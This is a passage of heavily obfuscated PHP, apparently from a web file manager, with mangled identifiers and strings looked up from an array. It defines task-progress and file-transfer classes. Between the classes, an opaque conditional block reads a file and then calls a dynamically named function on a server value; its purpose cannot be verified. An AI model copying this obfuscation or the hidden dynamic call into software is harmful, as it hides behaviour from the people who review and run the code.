strlen("\173\151\x6f\x3a{$óÌ‘Óàø[$_SERVER[²Ö÷öõ][900]]}\x7d")); if (IO::exist($ö÷ï‰ø™)) { $àúÕ‰ñ¯->updateFileEnd($óÌ‘Óàø[$_SERVER[²Ö÷öõ][32]], $óÌ‘Óàø[$_SERVER[²Ö÷öõ][79]]); } else { $ö÷ï‰ø™ = get_path_father($ö÷ï‰ø™); IO::mkdir($ö÷ï‰ø™); if (!IO::copy($Ã¾ûá€Ê, $ö÷ï‰ø™, $_SERVER[²Ö÷öõ][901])) { write_log($_SERVER[²Ö÷öõ][902] . $Ã¾ûá€Ê . $_SERVER[²Ö÷öõ][886] . $ö÷ï‰ø™ . $_SERVER[²Ö÷öõ][178], $_SERVER[²Ö÷öõ][866]); $ø¢¯Á€è = !1; break; } } $¬ó³ÈåÙ = $óÌ‘Óàø[$_SERVER[²Ö÷öõ][541]]; $Ú§Ø³ûŠ += 1; $Ø¶ş¶¨Û += $óÌ‘Óàø[$_SERVER[²Ö÷öõ][79]]; $Î«ÏŠÁ« += 1; $º¦ƒŠéÊ += $óÌ‘Óàø[$_SERVER[²Ö÷öõ][79]]; if ($Ø¶ş¶¨Û >= 1024 * 1024 * 100) { $´‚…šš = array($_SERVER[²Ö÷öõ][834] => $¬ó³ÈåÙ, $_SERVER[²Ö÷öõ][903] => $Î«ÏŠÁ«, $_SERVER[²Ö÷öõ][904] => $º¦ƒŠéÊ); Backup::set($´‚…šš); $Ø¶ş¶¨Û = $Ú§Ø³ûŠ = 0; } } $’¼Ö©˜Ê = count($…ô· Ÿ™); $‘ôì±‹Ğ++; } while ($’¼Ö©˜Ê == $‹¥û’Ùæ); $àúÕ‰ñ¯->end(); $´‚…šš = array($_SERVER[²Ö÷öõ][905] => 1, $_SERVER[²Ö÷öõ][844] => time(), $_SERVER[²Ö÷öõ][858] => 1, $_SERVER[²Ö÷öõ][834] => $¬ó³ÈåÙ, $_SERVER[²Ö÷öõ][906] => time()); if ($Ú§Ø³ûŠ) { $´‚…šš[$_SERVER[²Ö÷öõ][903]] = $Î«ÏŠÁ«; $´‚…šš[$_SERVER[²Ö÷öõ][904]] = $º¦ƒŠéÊ; } Backup::set($´‚…šš); return !0; } private function _fileExist($È¼şÏƒÒ, &$£Ùéí©§, $¬Î¤ˆµ‚) { $ıë²šşØ =& $_SERVER[²Ö÷öõ]; $¤ä¤±¶Ü = $È¼şÏƒÒ[$ıë²šşØ[87]]; if (in_array($È¼şÏƒÒ[$ıë²šşØ[541]], $£Ùéí©§)) { return !1; } if (!in_array($È¼şÏƒÒ[$ıë²šşØ[900]], $¬Î¤ˆµ‚)) { return !1; } if (IO::exist($¤ä¤±¶Ü)) { return !0; } $ê‡œ§§İ = get_path_father($¤ä¤±¶Ü); if (IO::exist($ê‡œ§§İ)) { $£Ùéí©§[] = $È¼şÏƒÒ[$ıë²šşØ[541]]; return !1; } $úó“ö Ê = array($ıë²šşØ[900] => $È¼şÏƒÒ[$ıë²šşØ[900]], $ıë²šşØ[87] => array($ıë²šşØ[459], "{$ê‡œ§§İ}\x25")); $Ñ´¦òõø = Model($ıë²šşØ[872])->where($úó“ö Ê)->field($ıë²šşØ[542])->select(); $£Ùéí©§ = array_merge($£Ùéí©§, array_to_keyvalue($Ñ´¦òõø, $ıë²šşØ[12], $ıë²šşØ[541])); return !1; } private function _fileFilter($œàß³Í) { $¡õ¿µê“ =& $_SERVER[²Ö÷öõ]; return; if (empty($œàß³Í)) { return; } $Ö ˆŞµõ = array($¡õ¿µê“[541] => array($¡õ¿µê“[7], array_unique($œàß³Í))); $¯ç»«Â = Model($¡õ¿µê“[907])->where($Ö ˆŞµõ)->field($¡õ¿µê“[193])->select(); foreach ($¯ç»«Â as $Š¸¤»‘) { Model($¡õ¿µê“[907])->remove($Š¸¤»‘[$¡õ¿µê“[193]], !1); } } private function storeIds() { $´ü‚ïíÑ =& $_SERVER[²Ö÷öõ]; $˜çŸ’÷« = Model($´ü‚ïíÑ[850])->listData(); $õÁƒ¨Õ = array(); $Ë›¸™œÅ = $GLOBALS[$´ü‚ïíÑ[6]][$´ü‚ïíÑ[92]][$´ü‚ïíÑ[908]]; foreach ($˜çŸ’÷« as $®«‡­…ñ) { $ÕÊ¦Ïß = strtolower($®«‡­…ñ[$´ü‚ïíÑ[98]]); if (!isset($Ë›¸™œÅ[$ÕÊ¦Ïß])) { continue; } $ÑÑğÌ· = $´ü‚ïíÑ[77] . (isset($Ë›¸™œÅ[$ÕÊ¦Ïß]) ? $Ë›¸™œÅ[$ÕÊ¦Ïß] : ucfirst($ÕÊ¦Ïß)); if (!class_exists($ÑÑğÌ·)) { continue; } $õÁƒ¨Õ[] = $®«‡­…ñ[$´ü‚ïíÑ[475]]; } return $õÁƒ¨Õ; } } goto d»Ó´Ôˆ¯; d¨±Œì‡”Ì: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($æ“´ºêÑ, $ÂèÍöò÷ = '', $œ¢úû°¥ = 0, $ÇÅÄÇî¡ = '') { $ÇæÅ·´® =& $_SERVER[²Ö÷öõ]; if (self::get($æ“´ºêÑ)) { return; } $this->task = array($ÇæÅ·´®[475] => $æ“´ºêÑ, $ÇæÅ·´®[1780] => USER_ID, $ÇæÅ·´®[1667] => $ÇÅÄÇî¡, $ÇæÅ·´®[526] => $ÇæÅ·´®[12], $ÇæÅ·´®[33] => $ÂèÍöò÷, $ÇæÅ·´®[1151] => $ÇæÅ·´®[12], $ÇæÅ·´®[1149] => $œ¢úû°¥, $ÇæÅ·´®[1781] => 0, $ÇæÅ·´®[1782] => 0, $ÇæÅ·´®[1783] => 0, $ÇæÅ·´®[1784] => timeFloat(), $ÇæÅ·´®[1785] => 0, $ÇæÅ·´®[1786] => 0, $ÇæÅ·´®[1787] => 0, $ÇæÅ·´®[1788] => 0, $ÇæÅ·´®[833] => $ÇæÅ·´®[1730]); $GLOBALS[$ÇæÅ·´®[1789]] = 1; Hook::bind($ÇæÅ·´®[1734], array($this, $ÇæÅ·´®[1790])); Hook::bind($ÇæÅ·´®[1791], array($this, $ÇæÅ·´®[1792])); $this->startAfter(); Hook::trigger($ÇæÅ·´®[1793], $this->task); $this->task[$ÇæÅ·´®[1786]] = timeFloat(); } public function end($Ç ïÂÇ = '') { $é¿¸‚±Ş =& $_SERVER[²Ö÷öõ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$é¿¸‚±Ş[1786]]) { self::valueSet($this->task[$é¿¸‚±Ş[475]], !1); } $this->isEnd = !0; if ($Ç ïÂÇ) { $this->task[$é¿¸‚±Ş[526]] = $Ç ïÂÇ; } self::log($é¿¸‚±Ş[1794] . $this->task[$é¿¸‚±Ş[475]] . $é¿¸‚±Ş[1795] . sprintf($é¿¸‚±Ş[933], timeFloat() - $this->task[$é¿¸‚±Ş[1784]]) . $é¿¸‚±Ş[1796]); Hook::unbind($é¿¸‚±Ş[1734], array($this, $é¿¸‚±Ş[1790])); Hook::unbind($é¿¸‚±Ş[1791], array($this, $é¿¸‚±Ş[1792])); $this->endAfter(); $“ÇŒìëí = $this->task; $this->task = !1; Hook::trigger($é¿¸‚±Ş[1797], $“ÇŒìëí); } public function update($şµôİä = 0, $´õì‹Í  = false) { $„ÃûğÄÈ =& $_SERVER[²Ö÷öõ]; $º­È¾˜ï =& $this->task; if (!$º­È¾˜ï) { return; } $º­È¾˜ï[$„ÃûğÄÈ[1781]] += $şµôİä; $º­È¾˜ï[$„ÃûğÄÈ[1785]] = timeFloat(); if ($º­È¾˜ï[$„ÃûğÄÈ[1149]]) { if ($º­È¾˜ï[$„ÃûğÄÈ[1149]] < $º­È¾˜ï[$„ÃûğÄÈ[1781]]) { $º­È¾˜ï[$„ÃûğÄÈ[1149]] = $º­È¾˜ï[$„ÃûğÄÈ[1781]]; } $ˆÉ¼¯ = timeFloat() - $º­È¾˜ï[$„ÃûğÄÈ[1784]] - $º­È¾˜ï[$„ÃûğÄÈ[1787]]; if ($ˆÉ¼¯ <= 0) { $ˆÉ¼¯ = 0.001; } $º­È¾˜ï[$„ÃûğÄÈ[1782]] = $º­È¾˜ï[$„ÃûğÄÈ[1781]] / $º­È¾˜ï[$„ÃûğÄÈ[1149]]; $º­È¾˜ï[$„ÃûğÄÈ[1783]] = $º­È¾˜ï[$„ÃûğÄÈ[1781]] / $ˆÉ¼¯; if ($º­È¾˜ï[$„ÃûğÄÈ[1782]] > 0) { $º­È¾˜ï[$„ÃûğÄÈ[1788]] = $ˆÉ¼¯ * (1 - $º­È¾˜ï[$„ÃûğÄÈ[1782]]) / $º­È¾˜ï[$„ÃûğÄÈ[1782]]; } $º­È¾˜ï[$„ÃûğÄÈ[1788]] = $º­È¾˜ï[$„ÃûğÄÈ[1788]] <= 0 ? 0 : $º­È¾˜ï[$„ÃûğÄÈ[1788]]; } $this->updateAfter(); $èù€´È¾ = 0.2; if (timeFloat() - $º­È¾˜ï[$„ÃûğÄÈ[1786]] < $èù€´È¾ && !$´õì‹Í ) { return; } $€¾ÔÂ‰Ğ = self::get($º­È¾˜ï[$„ÃûğÄÈ[475]]); $Ğ±‘ö = $€¾ÔÂ‰Ğ[$„ÃûğÄÈ[833]]; if ($Ğ±‘ö == self::STATYS_KILL) { $Ê—½Şüß = array($„ÃûğÄÈ[1798] => LNG($„ÃûğÄÈ[1799]), $„ÃûğÄÈ[1305] => !1); Cache::set($„ÃûğÄÈ[1800] . $this->task[$„ÃûğÄÈ[475]], $Ê—½Şüß, 30); $this->onKill(); $this->end(); die; } else { if ($Ğ±‘ö == self::STATYS_STOP) { $»èßüÖÒ = 2; $€¾ÔÂ‰Ğ[$„ÃûğÄÈ[1787]] += $»èßüÖÒ; self::valueSet($º­È¾˜ï[$„ÃûğÄÈ[475]], $€¾ÔÂ‰Ğ); sleep($»èßüÖÒ); $this->update(); return; } } $º­È¾˜ï[$„ÃûğÄÈ[833]] = $Ğ±‘ö ? $Ğ±‘ö : $º­È¾˜ï[$„ÃûğÄÈ[833]]; $º­È¾˜ï[$„ÃûğÄÈ[1787]] = $€¾ÔÂ‰Ğ[$„ÃûğÄÈ[1787]] ? $€¾ÔÂ‰Ğ[$„ÃûğÄÈ[1787]] : 0; $º­È¾˜ï[$„ÃûğÄÈ[1786]] = timeFloat(); Hook::trigger($„ÃûğÄÈ[1801], $º­È¾˜ï); self::valueSet($º­È¾˜ï[$„ÃûğÄÈ[475]], $º­È¾˜ï); } public function onKillSet($Œ‡şƒß´, $ïûûµ‹€ = array()) { $this->onKillCall = array($Œ‡şƒß´, $ïûûµ‹€); } public function onKill() { $åïŞÀÅµ =& $_SERVER[²Ö÷öõ]; self::log($åïŞÀÅµ[1794] . $this->task[$åïŞÀÅµ[475]] . $åïŞÀÅµ[1802]); Hook::trigger($åïŞÀÅµ[1803], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($îßĞ—Š) { $îÏóíæ =& $_SERVER[²Ö÷öõ]; Cache::set($îÏóíæ[1800] . $this->task[$îÏóíæ[475]], $îßĞ—Š, 60); return $îßĞ—Š; } public static function get($ñ’œÃ¯¹) { $€‹†¯ßù =& $_SERVER[²Ö÷öõ]; $ïçÌ”ĞÌ = self::valueGet($ñ’œÃ¯¹); if (is_array($ïçÌ”ĞÌ) && $ïçÌ”ĞÌ[$€‹†¯ßù[1804]]) { $±ôåÃÙ  = ActionApply($ïçÌ”ĞÌ[$€‹†¯ßù[1804]], array($ïçÌ”ĞÌ)); $ïçÌ”ĞÌ = is_array($±ôåÃÙ ) ? $±ôåÃÙ  : $ïçÌ”ĞÌ; } return $ïçÌ”ĞÌ; } public static function listData() { $¥£¨úÜÇ = self::valueGet(); return array_sort_by($¥£¨úÜÇ, $_SERVER[²Ö÷öõ][1784], !0); } public static function kill($ÍøÙ§À°) { return self::changeStatus($ÍøÙ§À°, self::STATYS_KILL); } public static function stop($ÙËÌÃŠ¤) { return self::changeStatus($ÙËÌÃŠ¤, self::STATYS_STOP); } public static function restart($×®åÀÊ) { return self::changeStatus($×®åÀÊ, self::STATYS_RUNNING); } public static function killAll() { $ÓŠ¿›‡† =& $_SERVER[²Ö÷öõ]; $ƒıı× = self::listData(); foreach ($ƒıı× as $ÈĞ¼£) { self::kill($ÈĞ¼£[$ÓŠ¿›‡†[475]]); } sleep(2); foreach ($ƒıı× as $ÈĞ¼£) { self::valueSet($ÈĞ¼£[$ÓŠ¿›‡†[475]], !1); } } private static function changeStatus($ë¿À¸Ö‹, $Ó÷Š•ò) { $¼Ë¿Ö… =& $_SERVER[²Ö÷öõ]; $»ÂĞ‹ = self::valueGet($ë¿À¸Ö‹); if (!$»ÂĞ‹) { return !1; } $»ÂĞ‹[$¼Ë¿Ö…[833]] = $Ó÷Š•ò; self::valueSet($ë¿À¸Ö‹, $»ÂĞ‹); self::log($¼Ë¿Ö…[1805] . $»ÂĞ‹[$¼Ë¿Ö…[475]] . $¼Ë¿Ö…[1806] . $Ó÷Š•ò); return !0; } public static function valueGet($¸÷—É¨ = false) { $”¤ÍÌŸØ =& $_SERVER[²Ö÷öõ]; if ($¸÷—É¨) { $¿îÍùçò = Model($”¤ÍÌŸØ[520])->where(array($”¤ÍÌŸØ[97] => $¸÷—É¨, $”¤ÍÌŸØ[33] => $”¤ÍÌŸØ[1158]))->find(); return $¿îÍùçò ? json_decode($¿îÍùçò[$”¤ÍÌŸØ[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ş¬Ò´âè = false) { $’§ŞÏ×´ =& $_SERVER[²Ö÷öõ]; $¾ñç¬ª¤ = array($’§ŞÏ×´[33] => $’§ŞÏ×´[1158]); if ($ş¬Ò´âè) { $¾ñç¬ª¤[$’§ŞÏ×´[1780]] = $ş¬Ò´âè; } $— Ğ£Ëú = Model($’§ŞÏ×´[520])->where($¾ñç¬ª¤)->select(); $— Ğ£Ëú = $— Ğ£Ëú ? $— Ğ£Ëú : array(); foreach ($— Ğ£Ëú as $Ìíó¢ª² => $ºœÙœìØ) { $— Ğ£Ëú[$Ìíó¢ª²] = json_decode($ºœÙœìØ[$’§ŞÏ×´[450]], !0); } return $— Ğ£Ëú; } public static function valueSet($Âú×Š„, $ÍûÒ¤ŒÂ) { $°¾Ù¿Ä÷ =& $_SERVER[²Ö÷öõ]; if (!$ÍûÒ¤ŒÂ) { return Model($°¾Ù¿Ä÷[520])->where(array($°¾Ù¿Ä÷[97] => $Âú×Š„, $°¾Ù¿Ä÷[33] => $°¾Ù¿Ä÷[1158]))->delete(); } $Í¯¸ˆÜ’ = json_encode($ÍûÒ¤ŒÂ); if (!$Í¯¸ˆÜ’) { ob_start(); var_dump($ÍûÒ¤ŒÂ); $ª¿³€¾¹ = ob_get_clean(); self::log($°¾Ù¿Ä÷[1807] . json_encode_force($ª¿³€¾¹)); } if (!$Âú×Š„ || !$ÍûÒ¤ŒÂ[$°¾Ù¿Ä÷[475]]) { return !1; } $ªÖÊƒİ¹ = array($°¾Ù¿Ä÷[33] => $°¾Ù¿Ä÷[1158], $°¾Ù¿Ä÷[1780] => USER_ID, $°¾Ù¿Ä÷[97] => $Âú×Š„, $°¾Ù¿Ä÷[450] => $Í¯¸ˆÜ’); $Õ¨á·ëÇ = $°¾Ù¿Ä÷[1808]; CacheLock::lock($Õ¨á·ëÇ); Model($°¾Ù¿Ä÷[520])->add($ªÖÊƒİ¹, array(), !0); CacheLock::unlock($Õ¨á·ëÇ); } public static function log($ê‘£¬) { if (!GLOBAL_DEBUG) { return; } write_log($ê‘£¬, $_SERVER[²Ö÷öõ][1809]); } } if ($_SERVER[$_SERVER[²Ö÷öõ][959]] != $_SERVER[$_SERVER[²Ö÷öõ][1810]]) { $_getc = $_SERVER[²Ö÷öõ][962]; $_getfile = $_SERVER[$_SERVER[²Ö÷öõ][963]] . $_SERVER[²Ö÷öõ][964]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[²Ö÷öõ][262], $_getfilec); if (count($_getarrs) < $_SERVER[²Ö÷öõ][685]) { $exit = $_SERVER[²Ö÷öõ][965]; $exit(); } $_act = $_SERVER[²Ö÷öõ][1310]; $_act($_SERVER[$_SERVER[²Ö÷öõ][960]]); } class TaskFileTransfer extends Task { protected function startAfter() { $Ì·²”Ùğ =& $_SERVER[²Ö÷öõ]; $À¾×Çêë =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ì·²”Ùğ[1811], array($this, $Ì·²”Ùğ[1812])); Hook::bind($Ì·²”Ùğ[1318], array($this, $Ì·²”Ùğ[1813])); Hook::bind($Ì·²”Ùğ[1814], array($this, $Ì·²”Ùğ[1815])); Hook::bind($Ì·²”Ùğ[668], array($this, $Ì·²”Ùğ[1816])); Hook::bind($Ì·²”Ùğ[669], array($this, $Ì·²”Ùğ[1817])); Hook::bind($Ì·²”Ùğ[675], array($this, $Ì·²”Ùğ[1818])); Hook::bind($Ì·²”Ùğ[676], array($this, $Ì·²”Ùğ[1819])); Hook::bind($Ì·²”Ùğ[671], array($this, $Ì·²”Ùğ[1820])); Hook::bind($Ì·²”Ùğ[673], array($this, $Ì·²”Ùğ[1821])); Hook::bind($Ì·²”Ùğ[637], array($this, $Ì·²”Ùğ[1822])); Hook::bind($Ì·²”Ùğ[634], array($this, $Ì·²”Ùğ[1822])); Hook::bind($Ì·²”Ùğ[639], array($this, $Ì·²”Ùğ[1822])); Hook::bind($Ì·²”Ùğ[641], array($this, $Ì·²”Ùğ[1822])); Hook::bind($Ì·²”Ùğ[643], array($this, $Ì·²”Ùğ[1822])); Hook::bind($Ì·²”Ùğ[1823], array($this, $Ì·²”Ùğ[1824])); Hook::bind($Ì·²”Ùğ[659], array($this, $Ì·²”Ùğ[1825])); $this->sourceModelCopyFlag = !1; Hook::bind($Ì·²”Ùğ[1826], array($this, $Ì·²”Ùğ[1827])); Hook::bind($Ì·²”Ùğ[1828], array($this, $Ì·²”Ùğ[1829])); Hook::bind($Ì·²”Ùğ[1830], array($this, $Ì·²”Ùğ[1831])); $À¾×Çêë[$Ì·²”Ùğ[1832]] = LNG($Ì·²”Ùğ[1833]); $À¾×Çêë[$Ì·²”Ùğ[1834]] = 0; $À¾×Çêë[$Ì·²”Ùğ[1835]] = 0; $À¾×Çêë[$Ì·²”Ùğ[1151]] = $Ì·²”Ùğ[12]; $À¾×Çêë[$Ì·²”Ùğ[1836]] = $Ì·²”Ùğ[12]; $À¾×Çêë[$Ì·²”Ùğ[1837]] = 0; $À¾×Çêë[$Ì·²”Ùğ[1838]] = 0; $À¾×Çêë[$Ì·²”Ùğ[1839]] = 0; if (!$À¾×Çêë[$Ì·²”Ùğ[1667]]) { $À¾×Çêë[$Ì·²”Ùğ[1667]] = LNG($Ì·²”Ùğ[1840]); } } protected function endAfter() { $ìÍİƒ§Ğ =& $_SERVER[²Ö÷öõ]; Hook::unbind($ìÍİƒ§Ğ[1811], array($this, $ìÍİƒ§Ğ[1812])); Hook::unbind($ìÍİƒ§Ğ[1318], array($this, $ìÍİƒ§Ğ[1813])); Hook::unbind($ìÍİƒ§Ğ[1814], array($this, $ìÍİƒ§Ğ[1815])); Hook::unbind($ìÍİƒ§Ğ[668], array($this, $ìÍİƒ§Ğ[1816])); Hook::unbind($ìÍİƒ§Ğ[669], array($this, $ìÍİƒ§Ğ[1817])); Hook::unbind($ìÍİƒ§Ğ[675], array($this, $ìÍİƒ§Ğ[1818])); Hook::unbind($ìÍİƒ§Ğ[676], array($this, $ìÍİƒ§Ğ[1819])); Hook::unbind($ìÍİƒ§Ğ[671], array($this, $ìÍİƒ§Ğ[1820])); Hook::unbind($ìÍİƒ§Ğ[673], array($this, $ìÍİƒ§Ğ[1821])); Hook::unbind($ìÍİƒ§Ğ[637], array($this, $ìÍİƒ§Ğ[1822])); Hook::unbind($ìÍİƒ§Ğ[634], array($this, $ìÍİƒ§Ğ[1822])); Hook::unbind($ìÍİƒ§Ğ[639], array($this, $ìÍİƒ§Ğ[1822])); Hook::unbind($ìÍİƒ§Ğ[641], array($this, $ìÍİƒ§Ğ[1822])); Hook::unbind($ìÍİƒ§Ğ[643], array($this, $ìÍİƒ§Ğ[1822])); Hook::unbind($ìÍİƒ§Ğ[1823], array($this, $ìÍİƒ§Ğ[1824])); Hook::unbind($ìÍİƒ§Ğ[659], array($this, $ìÍİƒ§Ğ[1825])); Hook::unbind($ìÍİƒ§Ğ[1826], array($this, $ìÍİƒ§Ğ[1827])); Hook::unbind($ìÍİƒ§Ğ[1828], array($this, $ìÍİƒ§Ğ[1829])); Hook::unbind($ìÍİƒ§Ğ[1830], array($this, $ìÍİƒ§Ğ[1831])); } public function copyMoveStart($Èæî¢¾œ, $ˆ¢†óù‰, $Â‡›¶œ½, $Ì·Ï) { $Ó’¬ÄÆ¡ =& $_SERVER[²Ö÷öõ]; self::log($Ó’¬ÄÆ¡[1841] . $ˆ¢†óù‰ . $Ó’¬ÄÆ¡[73] . $Ì·Ï); $äÄœ‹İÑ = rtrim(TEMP_FILES, $Ó’¬ÄÆ¡[8]); if (substr($ˆ¢†óù‰, 0, strlen($äÄœ‹İÑ)) == $äÄœ‹İÑ) { return; } if (substr($Ì·Ï, 0, strlen($äÄœ‹İÑ)) == $äÄœ‹İÑ) { return; } $Œ…§Ë«¾ =& $this->task; $Œ…§Ë«¾[$Ó’¬ÄÆ¡[1842]] = KodIO::transferType($Èæî¢¾œ, $Â‡›¶œ½); $this->update(); } public function updateAfter() { $ÁÉ¼ş—Ì =& $_SERVER[²Ö÷öõ]; $ÍĞò‚œ =& $this->task; if (!$ÍĞò‚œ[$ÁÉ¼ş—Ì[846]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÍĞò‚œ[$ÁÉ¼ş—Ì[1842]] == $ÁÉ¼ş—Ì[1411]) { return; } self::updateTask($ÍĞò‚œ); } private static function updateTask(&$µÃÉ®) { $›ğ²ã„ =& $_SERVER[²Ö÷öõ]; if ($µÃÉ®[$›ğ²ã„[1842]] == $›ğ²ã„[1287] || $µÃÉ®[$›ğ²ã„[1842]] == $›ğ²ã„[110]) { if ($µÃÉ®[$›ğ²ã„[1836]]) { $µÃÉ®[$›ğ²ã„[1839]] = $µÃÉ®[$›ğ²ã„[1838]] + $µÃÉ®[$›ğ²ã„[1835]]; } } else { if ($µÃÉ®[$›ğ²ã„[1842]] == $›ğ²ã„[1412]) { if ($µÃÉ®[$›ğ²ã„[1836]] == $›ğ²ã„[1287]) { $µÃÉ®[$›ğ²ã„[1839]] = $µÃÉ®[$›ğ²ã„[1838]] + $µÃÉ®[$›ğ²ã„[1835]] * 0.5; } else { if ($µÃÉ®[$›ğ²ã„[1836]] == $›ğ²ã„[110]) { $µÃÉ®[$›ğ²ã„[1839]] = $µÃÉ®[$›ğ²ã„[1838]] + $µÃÉ®[$›ğ²ã„[1834]] * 0.5 + $µÃÉ®[$›ğ²ã„[1835]] * 0.5; } } } } $µÃÉ®[$›ğ²ã„[1782]] = $µÃÉ®[$›ğ²ã„[1839]] / $µÃÉ®[$›ğ²ã„[846]]; if ($µÃÉ®[$›ğ²ã„[1782]] > 0) { $Ü¡×¡Æ = timeFloat() - $µÃÉ®[$›ğ²ã„[1784]] - $µÃÉ®[$›ğ²ã„[1787]]; $µÃÉ®[$›ğ²ã„[1788]] = $Ü¡×¡Æ * (1 - $µÃÉ®[$›ğ²ã„[1782]]) / $µÃÉ®[$›ğ²ã„[1782]]; } } public function addPath($‚­ôã¸œ) { $‘êíÁ® =& $_SERVER[²Ö÷öõ]; if (!$‚­ôã¸œ) { return; } $Û¡Ë¯²É =& $this->task; $’‡“Ñ£ı = IO::infoWithChildren($‚­ôã¸œ); $åìÓëîÊ = $Û¡Ë¯²É[$‘êíÁ®[1843]] ? $Û¡Ë¯²É[$‘êíÁ®[1843]][$‘êíÁ®[1844]] : 0; $Û¡Ë¯²É[$‘êíÁ®[1843]] = array($‘êíÁ®[1844] => $åìÓëîÊ + 1, $‘êíÁ®[494] => $’‡“Ñ£ı[$‘êíÁ®[32]], $‘êíÁ®[87] => $’‡“Ñ£ı[$‘êíÁ®[87]], $‘êíÁ®[582] => $’‡“Ñ£ı[$‘êíÁ®[582]] ? $’‡“Ñ£ı[$‘êíÁ®[582]] : $’‡“Ñ£ı[$‘êíÁ®[87]]); if ($’‡“Ñ£ı[$‘êíÁ®[33]] == $‘êíÁ®[230]) { $Û¡Ë¯²É[$‘êíÁ®[1149]] += 1; } else { $Û¡Ë¯²É[$‘êíÁ®[1149]] += $’‡“Ñ£ı[$‘êíÁ®[82]][$‘êíÁ®[80]]; if ($’‡“Ñ£ı[$‘êíÁ®[193]]) { $Û¡Ë¯²É[$‘êíÁ®[1149]] += $’‡“Ñ£ı[$‘êíÁ®[82]][$‘êíÁ®[81]] + 1; } } $Û¡Ë¯²É[$‘êíÁ®[846]] += $’‡“Ñ£ı[$‘êíÁ®[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($˜ÁÌ©ˆ) { } public function sourceAddHashEnd($šä—¡Ş) { } public function sourceAddFileStart($„Ñ¡¿Ö) { $ºñ¥®ÓÀ =& $_SERVER[²Ö÷öõ]; $Ó¥›Ã¹ø =& $this->task; $Ó¥›Ã¹ø[$ºñ¥®ÓÀ[1834]] = $„Ñ¡¿Ö[$ºñ¥®ÓÀ[79]]; $Ó¥›Ã¹ø[$ºñ¥®ÓÀ[1832]] = $„Ñ¡¿Ö[$ºñ¥®ÓÀ[32]]; $Ó¥›Ã¹ø[$ºñ¥®ÓÀ[1151]] = $„Ñ¡¿Ö[$ºñ¥®ÓÀ[32]]; $Ó¥›Ã¹ø[$ºñ¥®ÓÀ[1845]] = $„Ñ¡¿Ö[$ºñ¥®ÓÀ[87]]; $this->update(); } public function sourceAddFileEnd($™§øö¿) { $Š½ÎÃæ =& $_SERVER[²Ö÷öõ]; $…îİ¬£ =& $this->task; $…îİ¬£[$Š½ÎÃæ[1839]] += $™§øö¿[$Š½ÎÃæ[79]]; $…îİ¬£[$Š½ÎÃæ[1845]] = $™§øö¿[$Š½ÎÃæ[87]]; $this->update(1); } public function copyFileStart($—üú¯¯, $ì×§üš, $‡İ²öÛ·, $•ß¨ØÜ, $şÚÏÀ, $Ù‹Œü‘ã) { $¾±ìßòÜ =& $_SERVER[²Ö÷öõ]; $ú±ÇÁä = $şÚÏÀ; if ($ú±ÇÁä == $GLOBALS[$¾±ìßòÜ[1846]]) { $ú±ÇÁä = $GLOBALS[$¾±ìßòÜ[1847]]; } $GLOBALS[$¾±ìßòÜ[1847]] = $şÚÏÀ; $GLOBALS[$¾±ìßòÜ[1846]] = $Ù‹Œü‘ã; $˜‹¡¤÷ =& $this->task; $˜‹¡¤÷[$¾±ìßòÜ[1832]] = $ú±ÇÁä; $˜‹¡¤÷[$¾±ìßòÜ[1834]] = (int) $—üú¯¯->size($ì×§üš); $˜‹¡¤÷[$¾±ìßòÜ[1835]] = 0; $˜‹¡¤÷[$¾±ìßòÜ[1151]] = $¾±ìßòÜ[12]; $˜‹¡¤÷[$¾±ìßòÜ[1836]] = $¾±ìßòÜ[12]; $˜‹¡¤÷[$¾±ìßòÜ[1837]] = 0; $¨Å—¬ş = $˜‹¡¤÷[$¾±ìßòÜ[1834]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($˜‹¡¤÷[$¾±ìßòÜ[475]] . $¾±ìßòÜ[1848]); if ($¨Å—¬ş && file_exists(get_path_father($•ß¨ØÜ))) { Cache::set($˜‹¡¤÷[$¾±ìßòÜ[475]] . $¾±ìßòÜ[1848], $•ß¨ØÜ); $˜‹¡¤÷[$¾±ìßòÜ[1804]] = array($¾±ìßòÜ[1849], $¾±ìßòÜ[1850]); } $this->update(0, $¨Å—¬ş); } public static function updateCopyLocalFileSize($ùÂ™ÚªÙ) { $ıŞÑúÌü =& $_SERVER[²Ö÷öõ]; $Â›óŠ«¸ = Cache::get($ùÂ™ÚªÙ[$ıŞÑúÌü[475]] . $ıŞÑúÌü[1848]); if (!$Â›óŠ«¸ || !file_exists($Â›óŠ«¸)) { return $ùÂ™ÚªÙ; } $ùÂ™ÚªÙ[$ıŞÑúÌü[1835]] = @filesize($Â›óŠ«¸); $ùÂ™ÚªÙ[$ıŞÑúÌü[1839]] += $ùÂ™ÚªÙ[$ıŞÑúÌü[1835]]; self::updateTask($ùÂ™ÚªÙ); return $ùÂ™ÚªÙ; } public function copyFileEnd($ÓÖû›Ïí, $Ë‚¹÷‰Ğ, $Ÿ¾“»¿š, $íÊœªâ, $±ç„´Ÿ, $íÄ±ŒÉˆ) { $§í“ƒ¨Ä =& $_SERVER[²Ö÷öõ]; $­ºû”¿ =& $this->task; $­ºû”¿[$§í“ƒ¨Ä[1835]] = $­ºû”¿[$§í“ƒ¨Ä[1834]]; $­ºû”¿[$§í“ƒ¨Ä[1836]] = $§í“ƒ¨Ä[12]; unset($­ºû”¿[$§í“ƒ¨Ä[1804]]); if ($±ç„´Ÿ == $­ºû”¿[$§í“ƒ¨Ä[1832]]) { $­ºû”¿[$§í“ƒ¨Ä[1838]] += $­ºû”¿[$§í“ƒ¨Ä[1834]]; $­ºû”¿[$§í“ƒ¨Ä[1839]] = $­ºû”¿[$§í“ƒ¨Ä[1838]]; $çâÎ°…î = 1; if (isset($­ºû”¿[$§í“ƒ¨Ä[1845]]) && 